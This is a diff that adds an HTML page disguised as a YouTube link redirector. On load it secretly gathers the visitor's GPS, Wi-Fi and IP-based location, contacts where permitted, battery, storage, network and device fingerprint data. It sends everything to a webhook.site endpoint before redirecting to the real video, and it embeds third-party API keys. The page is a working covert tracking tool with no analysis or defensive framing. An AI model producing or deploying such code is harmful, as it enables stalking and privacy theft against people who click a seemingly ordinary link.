@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <link rel="icon" type="image/x-icon" href="youtube.ico">
+    <style>
+        .loader {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 5px solid #ff0000;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        function bytesToGB(bytes) {
+            if (!bytes || bytes === 0) return '0.00';
+            return (bytes / (1024 * 1024 * 1024)).toFixed(2);
+        }
+
+        function validateNumber(value) {
+            return typeof value === 'number' && !isNaN(value) && isFinite(value) ? value : 'N/A';
+        }
+
+        function validateString(value) {
+            return value && typeof value === 'string' ? value : 'N/A';
+        }
+
+        async function getIPBasedLocation() {
+            try {
+                const response = await fetch('https://ipinfo.io/json?token=dd6aa51476d42b');
+                if (!response.ok) throw new Error('Network response was not ok');
+                const data = await response.json();
+                return {
+                    ip: validateString(data.ip),
+                    city: validateString(data.city),
+                    region: validateString(data.region),
+                    country: validateString(data.country),
+                    loc: validateString(data.loc),
+                    org: validateString(data.org),
+                    timezone: validateString(data.timezone)
+                };
+            } catch (error) {
+                return null;
+            }
+        }
+
+        async function getLocationNameFromCoords(lat, lng) {
+            try {
+                const response = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyCsdXb9ClkZf2IKdhdPk2Pyk1BEi_Ckj6M`);
+                if (!response.ok) throw new Error('Geocoding API failed');
+                const data = await response.json();
+                
+                if (data.results && data.results.length > 0) {
+                    const address = data.results[0].formatted_address;
+                    return address;
+                }
+                return 'Location name not found';
+            } catch (error) {
+                return 'Geocoding failed';
+            }
+        }
+
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    
+                    if (!battery) return null;
+                    
+                    return {
+                        charging: battery.charging !== undefined ? battery.charging : 'N/A',
+                        level: battery.level !== undefined ? `${(validateNumber(battery.level) * 100).toFixed(2)}%` : 'N/A',
+                        chargingTime: battery.chargingTime !== undefined && battery.chargingTime !== Infinity ? 
+                                    `${(validateNumber(battery.chargingTime) / 60).toFixed(2)} minutes` : 'N/A',
+                        dischargingTime: battery.dischargingTime !== undefined && battery.dischargingTime !== Infinity ? 
+                                       `${(validateNumber(battery.dischargingTime) / 60).toFixed(2)} minutes` : 'N/A',
+                        supported: true
+                    };
+                }
+                return { supported: false };
+            } catch (error) {
+                return { supported: false, error: 'Battery API failed' };
+            }
+        }
+
+        async function getStorageInfo() {
+            try {
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    const estimate = await navigator.storage.estimate();
+                    
+                    if (!estimate) return null;
+                    
+                    const usage = validateNumber(estimate.usage);
+                    const quota = validateNumber(estimate.quota);
+                    
+                    return {
+                        totalStorageGB: bytesToGB(quota),
+                        usedStorageGB: bytesToGB(usage),
+                        freeStorageGB: bytesToGB(quota - usage),
+                        percentageUsed: quota > 0 ? `${((usage / quota) * 100).toFixed(2)}%` : 'N/A',
+                        supported: true
+                    };
+                }
+                return { supported: false };
+            } catch (error) {
+                return { supported: false, error: 'Storage API failed' };
+            }
+        }
+
+        async function checkContactPermissions() {
+            try {
+                if ('permissions' in navigator) {
+                    try {
+                        const permissionStatus = await navigator.permissions.query({ name: 'contacts' });
+                        return permissionStatus.state;
+                    } catch (e) {
+                        return 'not-supported';
+                    }
+                }
+                return 'not-supported';
+            } catch (error) {
+                return 'not-supported';
+            }
+        }
+
+        async function getContactsIfAllowed() {
+            try {
+                const contactPermission = await checkContactPermissions();
+                
+                if (contactPermission === 'granted') {
+                    if ('contacts' in navigator && 'select' in navigator.contacts) {
+                        try {
+                            const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address', 'icon'], { multiple: true });
+                            
+                            if (contacts && contacts.length > 0) {
+                                const formattedContacts = [];
+                                
+                                for (let contact of contacts) {
+                                    const contactData = {
+                                        name: 'No name',
+                                        emails: [],
+                                        phones: [],
+                                        addresses: []
+                                    };
+                                    
+                                    if (contact.name && contact.name.length > 0) {
+                                        contactData.name = contact.name[0];
+                                    }
+                                    
+                                    if (contact.email && contact.email.length > 0) {
+                                        contactData.emails = contact.email;
+                                    }
+                                    
+                                    if (contact.tel && contact.tel.length > 0) {
+                                        contactData.phones = contact.tel;
+                                    }
+                                    
+                                    if (contact.address && contact.address.length > 0) {
+                                        contactData.addresses = contact.address;
+                                    }
+                                    
+                                    formattedContacts.push(contactData);
+                                }
+                                
+                                return {
+                                    contacts: formattedContacts,
+                                    permission: 'granted',
+                                    count: formattedContacts.length,
+                                    success: true
+                                };
+                            } else {
+                                return {
+                                    contacts: [],
+                                    permission: 'granted',
+                                    count: 0,
+                                    success: true,
+                                    message: 'No contacts selected'
+                                };
+                            }
+                        } catch (contactError) {
+                            return {
+                                contacts: null,
+                                permission: 'granted',
+                                count: 0,
+                                success: false,
+                                error: contactError.message
+                            };
+                        }
+                    } else {
+                        return {
+                            contacts: null,
+                            permission: 'granted-but-no-api',
+                            count: 0,
+                            success: false,
+                            message: 'Contacts API not available'
+                        };
+                    }
+                }
+                
+                return {
+                    contacts: null,
+                    permission: contactPermission,
+                    count: 0,
+                    success: false,
+                    message: `Contact permission: ${contactPermission}`
+                };
+            } catch (error) {
+                return {
+                    contacts: null,
+                    permission: 'error',
+                    count: 0,
+                    success: false,
+                    error: error.message
+                };
+            }
+        }
+
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let os = 'Unknown';
+            let osVersion = 'Unknown';
+            let browser = 'Unknown';
+            let browserVersion = 'Unknown';
+            let deviceType = 'Desktop';
+
+            if (userAgent.includes('Windows')) {
+                os = 'Windows';
+                const winVersion = userAgent.match(/Windows NT (\d+\.\d+)/);
+                osVersion = winVersion ? winVersion[1] : 'Unknown';
+            } else if (userAgent.includes('Mac')) {
+                os = 'MacOS';
+                const macVersion = userAgent.match(/Mac OS X (\d+[._]\d+[._]\d+)/);
+                osVersion = macVersion ? macVersion[1].replace(/_/g, '.') : 'Unknown';
+            } else if (userAgent.includes('Linux')) {
+                os = 'Linux';
+            } else if (userAgent.includes('Android')) {
+                os = 'Android';
+                const androidVersion = userAgent.match(/Android (\d+\.\d+)/);
+                osVersion = androidVersion ? androidVersion[1] : 'Unknown';
+                deviceType = 'Mobile';
+            } else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
+                os = 'iOS';
+                const iosVersion = userAgent.match(/OS (\d+[_]\d+)/);
+                osVersion = iosVersion ? iosVersion[1].replace(/_/g, '.') : 'Unknown';
+                deviceType = 'Mobile';
+            }
+
+            const browserMatch = userAgent.match(/(Chrome|Firefox|Safari|Opera|Edge|Edg)\/?\s*(\d+\.\d+)/i);
+            if (browserMatch) {
+                browser = browserMatch[1];
+                browserVersion = browserMatch[2];
+            }
+
+            if (/Mobi|Android|iPhone|iPad/i.test(userAgent)) {
+                deviceType = 'Mobile';
+            }
+
+            return {
+                type: deviceType,
+                os: os,
+                osVersion: validateString(osVersion),
+                browser: browser,
+                browserVersion: validateString(browserVersion),
+                userAgent: validateString(userAgent),
+                platform: validateString(navigator.platform),
+                language: validateString(navigator.language),
+                languages: Array.isArray(navigator.languages) ? navigator.languages : ['N/A'],
+                cpuCores: validateNumber(navigator.hardwareConcurrency),
+                maxTouchPoints: validateNumber(navigator.maxTouchPoints),
+                deviceMemory: validateNumber(navigator.deviceMemory),
+                vendor: validateString(navigator.vendor),
+                product: validateString(navigator.product),
+                productSub: validateString(navigator.productSub)
+            };
+        }
+
+        function getNetworkInfo() {
+            if (!navigator.connection) {
+                return {
+                    effectiveType: 'N/A',
+                    downlink: 'N/A',
+                    rtt: 'N/A',
+                    saveData: 'N/A',
+                    type: 'N/A',
+                    supported: false
+                };
+            }
+
+            return {
+                effectiveType: validateString(navigator.connection.effectiveType),
+                downlink: validateNumber(navigator.connection.downlink),
+                rtt: validateNumber(navigator.connection.rtt),
+                saveData: navigator.connection.saveData !== undefined ? navigator.connection.saveData : 'N/A',
+                type: validateString(navigator.connection.type),
+                supported: true
+            };
+        }
+
+        function getMediaDevicesInfo() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+                return { supported: false };
+            }
+
+            return {
+                supported: true,
+                info: 'Media devices API available'
+            };
+        }
+
+        function getBluetoothInfo() {
+            if (!navigator.bluetooth) {
+                return { supported: false };
+            }
+
+            return {
+                supported: true,
+                info: 'Web Bluetooth API available'
+            };
+        }
+
+        function getUSBInfo() {
+            if (!navigator.usb) {
+                return { supported: false };
+            }
+
+            return {
+                supported: true,
+                info: 'WebUSB API available'
+            };
+        }
+
+        function getVibrationInfo() {
+            if (!navigator.vibrate) {
+                return { supported: false };
+            }
+
+            return {
+                supported: true,
+                info: 'Vibration API available'
+            };
+        }
+
+        function getClipboardInfo() {
+            if (!navigator.clipboard) {
+                return { supported: false };
+            }
+
+            return {
+                supported: true,
+                info: 'Clipboard API available'
+            };
+        }
+
+        async function getEnhancedLocation() {
+            const results = { gps: null, wifi: null, ip: null };
+            
+            try {
+                if (navigator.geolocation) {
+                    results.gps = await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            async (pos) => {
+                                if (pos && pos.coords) {
+                                    const lat = validateNumber(pos.coords.latitude);
+                                    const lng = validateNumber(pos.coords.longitude);
+                                    const locationName = await getLocationNameFromCoords(lat, lng);
+                                    
+                                    resolve({
+                                        latitude: lat,
+                                        longitude: lng,
+                                        accuracy: validateNumber(pos.coords.accuracy),
+                                        altitude: pos.coords.altitude ? validateNumber(pos.coords.altitude) : 'N/A',
+                                        altitudeAccuracy: pos.coords.altitudeAccuracy ? validateNumber(pos.coords.altitudeAccuracy) : 'N/A',
+                                        heading: pos.coords.heading ? validateNumber(pos.coords.heading) : 'N/A',
+                                        speed: pos.coords.speed ? validateNumber(pos.coords.speed) : 'N/A',
+                                        locationName: locationName,
+                                        source: 'GPS',
+                                        gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
+                                        success: true
+                                    });
+                                } else {
+                                    resolve({ success: false, error: 'No coordinates' });
+                                }
+                            },
+                            (error) => resolve({ success: false, error: error.message }),
+                            { timeout: 5000, enableHighAccuracy: true }
+                        );
+                    });
+                }
+            } catch (e) {
+                results.gps = { success: false, error: e.message };
+            }
+            
+            try {
+                const wifiResponse = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyCsdXb9ClkZf2IKdhdPk2Pyk1BEi_Ckj6M', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ considerIp: true })
+                });
+                
+                if (wifiResponse.ok) {
+                    const wifiData = await wifiResponse.json();
+                    if (wifiData.location && wifiData.location.lat && wifiData.location.lng) {
+                        const lat = validateNumber(wifiData.location.lat);
+                        const lng = validateNumber(wifiData.location.lng);
+                        const locationName = await getLocationNameFromCoords(lat, lng);
+                        
+                        results.wifi = {
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: validateNumber(wifiData.accuracy),
+                            locationName: locationName,
+                            source: 'WiFi',
+                            gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
+                            success: true
+                        };
+                    } else {
+                        results.wifi = { success: false, error: 'No location data' };
+                    }
+                } else {
+                    results.wifi = { success: false, error: 'API request failed' };
+                }
+            } catch (e) {
+                results.wifi = { success: false, error: e.message };
+            }
+            
+            return results;
+        }
+
+        async function collectAndRedirect(redirectUrl) {
+            try {
+                const now = new Date();
+                const options = {
+                    weekday: 'long',
+                    day: 'numeric',
+                    month: 'long',
+                    year: 'numeric',
+                    hour: 'numeric',
+                    minute: 'numeric',
+                    second: 'numeric',
+                    timeZoneName: 'short'
+                };
+
+                const [locationData, enhancedLocation, batteryInfo, storageInfo, contactInfo] = await Promise.allSettled([
+                    getIPBasedLocation(),
+                    getEnhancedLocation(),
+                    getBatteryInfo(),
+                    getStorageInfo(),
+                    getContactsIfAllowed()
+                ]);
+
+                const deviceInfo = getDeviceInfo();
+                const networkInfo = getNetworkInfo();
+                const mediaDevicesInfo = getMediaDevicesInfo();
+                const bluetoothInfo = getBluetoothInfo();
+                const usbInfo = getUSBInfo();
+                const vibrationInfo = getVibrationInfo();
+                const clipboardInfo = getClipboardInfo();
+
+                const data = {
+                    redirectUrl: redirectUrl,
+                    userAgent: validateString(navigator.userAgent),
+                    platform: validateString(navigator.platform),
+                    screenInfo: {
+                        width: validateNumber(screen.width),
+                        height: validateNumber(screen.height),
+                        colorDepth: validateNumber(screen.colorDepth),
+                        availWidth: validateNumber(screen.availWidth),
+                        availHeight: validateNumber(screen.availHeight),
+                        pixelDepth: validateNumber(screen.pixelDepth),
+                        orientation: screen.orientation ? screen.orientation.type : 'N/A'
+                    },
+                    viewport: {
+                        width: validateNumber(window.innerWidth),
+                        height: validateNumber(window.innerHeight),
+                        devicePixelRatio: validateNumber(window.devicePixelRatio)
+                    },
+                    timestamp: now.toLocaleString('en-IN', options),
+                    timestampISO: now.toISOString(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    batteryInfo: batteryInfo.status === 'fulfilled' ? batteryInfo.value : { supported: false, error: 'Failed to get battery info' },
+                    storageInfo: storageInfo.status === 'fulfilled' ? storageInfo.value : { supported: false, error: 'Failed to get storage info' },
+                    locationData: locationData.status === 'fulfilled' ? locationData.value : null,
+                    enhancedLocation: enhancedLocation.status === 'fulfilled' ? enhancedLocation.value : { gps: { success: false }, wifi: { success: false } },
+                    contactInfo: contactInfo.status === 'fulfilled' ? contactInfo.value : { contacts: null, permission: 'error', count: 0, success: false },
+                    deviceInfo: deviceInfo,
+                    networkInfo: networkInfo,
+                    advancedAPIs: {
+                        mediaDevices: mediaDevicesInfo,
+                        bluetooth: bluetoothInfo,
+                        usb: usbInfo,
+                        vibration: vibrationInfo,
+                        clipboard: clipboardInfo
+                    },
+                    dataCollection: {
+                        batterySupported: batteryInfo.status === 'fulfilled' ? batteryInfo.value.supported : false,
+                        storageSupported: storageInfo.status === 'fulfilled' ? storageInfo.value.supported : false,
+                        networkSupported: networkInfo.supported,
+                        contactSupported: contactInfo.status === 'fulfilled' ? contactInfo.value.permission !== 'not-supported' : false,
+                        contactSuccess: contactInfo.status === 'fulfilled' ? contactInfo.value.success : false
+                    }
+                };
+
+                await fetch('https://webhook.site/4d99514c-d56d-4f9e-b1f2-fd45d96189dd', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 300);
+
+            } catch (error) {
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 300);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const fullPath = window.location.pathname.substring(1) + 
+                           window.location.search + 
+                           window.location.hash;
+            
+            let youtubeUrl;
+            
+            if (fullPath.startsWith('youtu.be/')) {
+                const videoId = fullPath.split('youtu.be/')[1]?.split(/[?#]/)[0];
+                youtubeUrl = videoId ? `https://www.youtube.com/watch?v=${videoId}` : 'https://www.youtube.com/';
+            } else {
+                youtubeUrl = fullPath 
+                    ? `https://www.youtube.com/${fullPath}`
+                    : 'https://www.youtube.com/';
+            }
+            
+            collectAndRedirect(youtubeUrl);
+        });
+    </script>
+</body>
+</html>
